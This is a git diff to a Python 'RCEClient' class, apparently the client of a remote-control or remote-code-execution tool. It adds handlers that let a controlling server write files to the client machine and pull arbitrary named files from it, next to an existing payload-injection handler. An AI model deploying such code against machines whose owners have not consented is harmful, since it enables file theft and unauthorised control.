@@ -1,6 +1,8 @@
 import sys
+from pathlib import Path
 
 from src.core.base_client import BaseClientThread
+from src.core.exception import MessageTypeError, FileWriteError, FileReadError
 from src.core.logger import Logger
 from src.core.message import MessageType, Message
 
@@ -36,6 +38,16 @@ class RCEClient(BaseClientThread):
                 if message.is_type(MessageType.ECHO):
                     self.__logger.info(message.data.decode())
                     self.send_message(message)
+                elif message.is_type(MessageType.FILE_UPLOAD):
+                    self.__logger.debug("Receiving file...")
+                    file_path = Path(message.data.decode())
+                    self.receive_file(file_path.name, file_path.parent)
+                    self.__logger.info(f"File '{file_path}' received")
+                elif message.is_type(MessageType.FILE_DOWNLOAD):
+                    self.__logger.debug("Sending file...")
+                    filename = message.data.decode()
+                    self.send_file(filename)
+                    self.__logger.debug(f"File '{filename}' sent")
                 elif message.is_type(MessageType.INJECT):
                     self.__logger.debug(f"inject from {message.get_sender()}:\n\t{message}")
                     self.inject_payload(message)
@@ -46,6 +58,9 @@ class RCEClient(BaseClientThread):
                     self.__logger.debug(f"error from {message.get_sender()}:\n\t{message}")
                 else:
                     self.__logger.debug(f"Unknown message type from {message.get_sender()}: {message.get_type()}")
+            except (FileNotFoundError, MessageTypeError, FileWriteError, FileReadError) as e:
+                self.__logger.error(e)
+                self.send_message(Message(message_type=MessageType.ERROR, data=e.args[0].encode()))
             except OSError as e:
                 self.close()
                 self.__logger.error("DISCONNECTED from server")
